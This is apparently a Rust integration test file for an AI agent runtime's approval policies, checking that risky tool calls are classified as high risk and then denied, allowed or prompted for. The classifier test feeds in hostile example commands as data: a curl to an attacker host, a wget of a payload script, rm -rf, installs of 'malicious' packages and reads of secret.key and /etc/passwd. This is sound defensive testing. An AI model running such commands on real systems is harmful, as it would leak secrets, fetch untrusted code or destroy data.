//! Integration tests for human-in-the-loop interactive approval policies for dangerous operations.
//!
//! Verifies:
//! - High-risk operation classification (`git push`, file deletions, outbound network, package installations, outside workspace).
//! - Approval policy modes: `prompt`, `deny`, and `allow`.
//! - Prompt decisions: `yes` (allow once), `always` (allow for session), `no` (deny).
//! - Automatic fallback to `deny` when non-interactive (non-TTY / headless).
//! - Declarative YAML manifest configuration (`approval: prompt`, `deny`, `allow`).
//! - AgentLoop interception, RunStore audit logging, and tool result reporting.

use cortex_core::permissions::{
    classify_operation, ApprovalDecision, ApprovalMode, HighRiskOperation, RiskLevel,
};
use cortex_core::{CortexError, ExecutionEvent};
use cortex_runtime::agent::approval::{
    ApprovalHandler, ApprovalInterceptor, CallbackApprovalHandler, InteractiveApprovalHandler,
    StaticApprovalHandler,
};
use cortex_runtime::agent::manifest::AgentYamlManifest;
use cortex_runtime::storage::RunStore;
use cortex_runtime::tool::{PermissionLevel, Tool, ToolDefinition, ToolRegistry, ToolResult};
use cortex_runtime::{
    AgentContext, AgentLoop, MockModelProvider, ModelOutput, ToolCall, Workspace,
};
use serde_json::json;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, AtomicUsize, Ordering};
use std::sync::Arc;

static TEST_COUNTER: AtomicU64 = AtomicU64::new(1);

fn create_temp_workspace() -> (PathBuf, Arc<Workspace>) {
    let id = TEST_COUNTER.fetch_add(1, Ordering::SeqCst);
    let temp_dir = std::env::temp_dir().join(format!(
        "cortex_approval_test_{}_{}",
        std::process::id(),
        id
    ));
    let _ = fs::remove_dir_all(&temp_dir);
    fs::create_dir_all(&temp_dir).expect("failed to create temp dir");
    let ws = Arc::new(Workspace::new(&temp_dir).expect("failed to create workspace"));
    (temp_dir, ws)
}

struct MockDangerousTool {
    name: String,
    def: ToolDefinition,
    executed: Arc<AtomicUsize>,
}

impl MockDangerousTool {
    fn new(name: &str, executed: Arc<AtomicUsize>) -> Self {
        Self {
            name: name.to_string(),
            def: ToolDefinition::new(
                name,
                "A dangerous mock tool",
                json!({
                    "type": "object",
                    "properties": {
                        "target": { "type": "string" },
                        "command": { "type": "string" },
                        "url": { "type": "string" }
                    }
                }),
            )
            .with_permission(PermissionLevel::Danger),
            executed,
        }
    }
}

impl Tool for MockDangerousTool {
    fn definition(&self) -> &ToolDefinition {
        &self.def
    }

    fn execute(&self, _input: &serde_json::Value) -> cortex_core::Result<ToolResult> {
        self.executed.fetch_add(1, Ordering::SeqCst);
        Ok(ToolResult::success(format!("executed {}", self.name)))
    }
}

#[test]
fn test_classify_high_risk_scenarios() {
    // 1. git push
    let (risk, op) = classify_operation("git_push", &json!({}), None);
    assert_eq!(risk, RiskLevel::High);
    assert_eq!(op.unwrap().category, "git_push");

    let (risk, op) = classify_operation(
        "shell",
        &json!({"command": "git push -u origin feature"}),
        None,
    );
    assert_eq!(risk, RiskLevel::High);
    assert_eq!(op.unwrap().category, "git_push");

    // 2. file deletions
    let (risk, op) = classify_operation("delete_file", &json!({"path": "important.rs"}), None);
    assert_eq!(risk, RiskLevel::High);
    assert_eq!(op.unwrap().category, "file_deletion");

    let (risk, op) = classify_operation("shell", &json!({"command": "rm -rf /tmp/data"}), None);
    assert_eq!(risk, RiskLevel::High);
    assert_eq!(op.unwrap().category, "file_deletion");

    // 3. outbound network
    let (risk, op) = classify_operation("curl", &json!({"url": "https://attacker.com/leak"}), None);
    assert_eq!(risk, RiskLevel::High);
    assert_eq!(op.unwrap().category, "network_access");

    let (risk, op) = classify_operation(
        "shell",
        &json!({"command": "wget https://example.com/payload.sh"}),
        None,
    );
    assert_eq!(risk, RiskLevel::High);
    assert_eq!(op.unwrap().category, "network_access");

    // 4. package installations
    let (risk, op) = classify_operation(
        "shell",
        &json!({"command": "pip install malicious-pkg"}),
        None,
    );
    assert_eq!(risk, RiskLevel::High);
    assert_eq!(op.unwrap().category, "package_installation");

    let (risk, op) = classify_operation("shell", &json!({"command": "npm install -g evil"}), None);
    assert_eq!(risk, RiskLevel::High);
    assert_eq!(op.unwrap().category, "package_installation");

    let (risk, op) = classify_operation(
        "shell",
        &json!({"command": "cargo install cargo-watch"}),
        None,
    );
    assert_eq!(risk, RiskLevel::High);
    assert_eq!(op.unwrap().category, "package_installation");

    // 5. outside workspace
    let ws = Path::new("/workspace/project");
    let (risk, op) =
        classify_operation("shell", &json!({"command": "cat ../secret.key"}), Some(ws));
    assert_eq!(risk, RiskLevel::High);
    assert_eq!(op.unwrap().category, "outside_workspace");

    let (risk, op) = classify_operation("shell", &json!({"command": "ls /etc/passwd"}), Some(ws));
    assert_eq!(risk, RiskLevel::High);
    assert_eq!(op.unwrap().category, "outside_workspace");

    // Low risk read-only
    let (risk, op) = classify_operation("read_file", &json!({"path": "src/lib.rs"}), Some(ws));
    assert_eq!(risk, RiskLevel::Low);
    assert!(op.is_none());

    let (risk, op) = classify_operation("git_status", &json!({}), Some(ws));
    assert_eq!(risk, RiskLevel::Low);
    assert!(op.is_none());

    let (risk, op) = classify_operation("git_diff", &json!({}), Some(ws));
    assert_eq!(risk, RiskLevel::Low);
    assert!(op.is_none());
}

#[test]
fn test_agent_loop_intercepts_high_risk_in_deny_mode() {
    let (_dir, ws) = create_temp_workspace();
    let db_path = ws.root().join("run_store.db");
    let store = Arc::new(RunStore::open(&db_path).expect("open runstore"));

    let executed_count = Arc::new(AtomicUsize::new(0));
    let git_push_tool = MockDangerousTool::new("git_push", executed_count.clone());

    let registry = ToolRegistry::new();
    registry.register(Arc::new(git_push_tool)).unwrap();

    let mut context = AgentContext::new("Push changes to origin").with_workspace(ws);

    let model = MockModelProvider::new();
    model.queue_response(ModelOutput::ToolCalls(vec![ToolCall::new(
        "call-1",
        "git_push",
        json!({}),
    )]));
    model.queue_response(ModelOutput::FinalAnswer(
        "Stopped after push rejection".to_string(),
    ));

    let agent_loop = AgentLoop::new(5)
        .with_store(store.clone())
        .with_approval_mode(ApprovalMode::Deny);

    let res = agent_loop.run(&mut context, &model, &registry).unwrap();
    assert_eq!(res.final_answer, "Stopped after push rejection");
    // Tool was never executed!
    assert_eq!(executed_count.load(Ordering::SeqCst), 0);

    // Verify ToolFailed event was logged in store
    let events = store.get_events(&context.run_id).unwrap();
    let failed_event = events
        .iter()
        .find(|e| matches!(&e.event, ExecutionEvent::ToolFailed { tool_name, .. } if tool_name == "git_push"));
    assert!(
        failed_event.is_some(),
        "ToolFailed event must be recorded for denied approval"
    );
}

#[test]
fn test_agent_loop_permits_high_risk_in_allow_mode() {
    let (_dir, ws) = create_temp_workspace();
    let executed_count = Arc::new(AtomicUsize::new(0));
    let git_push_tool = MockDangerousTool::new("git_push", executed_count.clone());

    let registry = ToolRegistry::new();
    registry.register(Arc::new(git_push_tool)).unwrap();

    let mut context = AgentContext::new("Push changes to origin").with_workspace(ws);

    let model = MockModelProvider::new();
    model.queue_response(ModelOutput::ToolCalls(vec![ToolCall::new(
        "call-1",
        "git_push",
        json!({}),
    )]));
    model.queue_response(ModelOutput::FinalAnswer("Pushed successfully".to_string()));

    let agent_loop = AgentLoop::new(5).with_approval_mode(ApprovalMode::Allow);

    let res = agent_loop.run(&mut context, &model, &registry).unwrap();
    assert_eq!(res.final_answer, "Pushed successfully");
    // Tool was executed
    assert_eq!(executed_count.load(Ordering::SeqCst), 1);
}

#[test]
fn test_agent_loop_prompt_mode_with_interactive_decisions() {
    let (_dir, ws) = create_temp_workspace();
    let executed_count = Arc::new(AtomicUsize::new(0));
    let delete_tool = MockDangerousTool::new("delete_file", executed_count.clone());

    let registry = ToolRegistry::new();
    registry.register(Arc::new(delete_tool)).unwrap();

    // 1. Operator rejects
    let mut context1 = AgentContext::new("Delete temporary files").with_workspace(ws.clone());
    let model1 = MockModelProvider::new();
    model1.queue_response(ModelOutput::ToolCalls(vec![ToolCall::new(
        "c1",
        "delete_file",
        json!({"path": "foo.txt"}),
    )]));
    model1.queue_response(ModelOutput::FinalAnswer("Cancelled".to_string()));

    let handler_reject = Arc::new(StaticApprovalHandler::new(ApprovalDecision::Deny));
    let agent_loop_reject =
        AgentLoop::new(5).with_approval_policy(ApprovalMode::Prompt, Some(handler_reject));

    let _ = agent_loop_reject
        .run(&mut context1, &model1, &registry)
        .unwrap();
    assert_eq!(executed_count.load(Ordering::SeqCst), 0);

    // 2. Operator allows once
    let mut context2 = AgentContext::new("Delete temporary files").with_workspace(ws.clone());
    let model2 = MockModelProvider::new();
    model2.queue_response(ModelOutput::ToolCalls(vec![ToolCall::new(
        "c2",
        "delete_file",
        json!({"path": "foo.txt"}),
    )]));
    model2.queue_response(ModelOutput::FinalAnswer("Deleted".to_string()));

    let handler_allow = Arc::new(StaticApprovalHandler::new(ApprovalDecision::AllowOnce));
    let agent_loop_allow =
        AgentLoop::new(5).with_approval_policy(ApprovalMode::Prompt, Some(handler_allow));

    let _ = agent_loop_allow
        .run(&mut context2, &model2, &registry)
        .unwrap();
    assert_eq!(executed_count.load(Ordering::SeqCst), 1);
}

#[test]
fn test_approval_prompt_allow_always_caches_for_session() {
    let (_dir, ws) = create_temp_workspace();
    let executed_count = Arc::new(AtomicUsize::new(0));
    let delete_tool = MockDangerousTool::new("delete_file", executed_count.clone());

    let registry = ToolRegistry::new();
    registry.register(Arc::new(delete_tool)).unwrap();

    let prompt_invocations = Arc::new(AtomicUsize::new(0));
    let prompt_inv_clone = prompt_invocations.clone();

    let handler = Arc::new(CallbackApprovalHandler::new(
        move |_op: &HighRiskOperation| {
            prompt_inv_clone.fetch_add(1, Ordering::SeqCst);
            Ok(ApprovalDecision::AllowAlways)
        },
    ));

    let interceptor = Arc::new(ApprovalInterceptor::new(ApprovalMode::Prompt, handler));

    let mut context = AgentContext::new("Delete files repeatedly")
        .with_workspace(ws)
        .with_approval_interceptor(interceptor.clone());

    let model = MockModelProvider::new();
    model.queue_response(ModelOutput::ToolCalls(vec![
        ToolCall::new("c1", "delete_file", json!({"path": "f1.txt"})),
        ToolCall::new("c2", "delete_file", json!({"path": "f2.txt"})),
    ]));
    model.queue_response(ModelOutput::FinalAnswer("All deleted".to_string()));

    let agent_loop = AgentLoop::new(5).with_approval_interceptor(interceptor);
    let _ = agent_loop.run(&mut context, &model, &registry).unwrap();

    assert_eq!(executed_count.load(Ordering::SeqCst), 2);
    // Prompt was only shown once because AllowAlways cached the approval for the session!
    assert_eq!(prompt_invocations.load(Ordering::SeqCst), 1);
}

#[test]
fn test_headless_non_tty_auto_denies() {
    let handler = InteractiveApprovalHandler::new();
    let op = HighRiskOperation::new(
        "git_push",
        "git_push",
        "attempting git push",
        "git_push tool",
    );

    // In cargo test, stdin is not an interactive terminal
    let decision = handler.request_approval(&op).unwrap();
    // Non-interactive fallback must return Deny
    assert_eq!(decision, ApprovalDecision::Deny);
}

#[test]
fn test_yaml_manifest_approval_configuration() {
    let yaml_content = r#"
name: secure-agent
role: SecurityAuditor
workspace: ./workspace
model: gpt-4o
system_prompt: You are a safe autonomous auditor
approval: deny
permissions:
  filesystem: workspace
  shell: true
  git_push: false
"#;

    let manifest = AgentYamlManifest::from_yaml_str(yaml_content).expect("parse manifest");
    assert_eq!(manifest.approval_mode, Some(ApprovalMode::Deny));

    let runtime = manifest.into_manifest().expect("convert manifest");
    assert_eq!(runtime.permissions.approval_mode, ApprovalMode::Deny);
}

#[test]
fn test_yaml_manifest_permissions_nested_approval() {
    let yaml_content = r#"
name: prompt-agent
role: Developer
workspace: ./workspace
model: claude-3-5-sonnet
system_prompt: You are an agent that prompts for risky actions
permissions:
  approval: prompt
  filesystem: workspace
  shell: true
"#;

    let manifest = AgentYamlManifest::from_yaml_str(yaml_content).expect("parse manifest");
    let runtime = manifest.into_manifest().expect("convert manifest");
    assert_eq!(runtime.permissions.approval_mode, ApprovalMode::Prompt);
}

#[test]
fn test_tool_registry_with_approval_interceptor() {
    let executed_count = Arc::new(AtomicUsize::new(0));
    let delete_tool = MockDangerousTool::new("delete_file", executed_count.clone());

    let interceptor = Arc::new(ApprovalInterceptor::deny());
    let registry = ToolRegistry::new().with_approval_interceptor(interceptor);
    registry.register(Arc::new(delete_tool)).unwrap();

    let err = registry.execute("delete_file", &json!({"path": "victim.txt"}));
    assert!(err.is_err());
    assert!(matches!(err.unwrap_err(), CortexError::PermissionDenied(_)));
    assert_eq!(executed_count.load(Ordering::SeqCst), 0);
}
